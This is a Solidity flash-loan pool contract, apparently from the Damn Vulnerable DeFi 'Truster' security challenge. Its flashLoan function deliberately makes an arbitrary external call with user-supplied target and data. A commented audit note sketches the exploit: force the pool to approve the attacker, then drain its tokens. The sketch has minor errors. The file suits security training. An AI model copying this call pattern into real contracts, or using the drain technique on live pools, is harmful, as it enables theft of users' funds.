pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard {
    IERC20 public damnValuableToken;

    constructor(address tokenAddress) public {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success,) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
    /// @notice first approve attack contract to spend the tokens from the pool then transfer the tokens after implementing the flashloan
    /* @audit 
     * function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token); 
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
        pool.flashloan(0,msg.sender,address(token),data);
        token.transferFrom(pool,msg.sender,token.balanceOf(pool));
     */
}
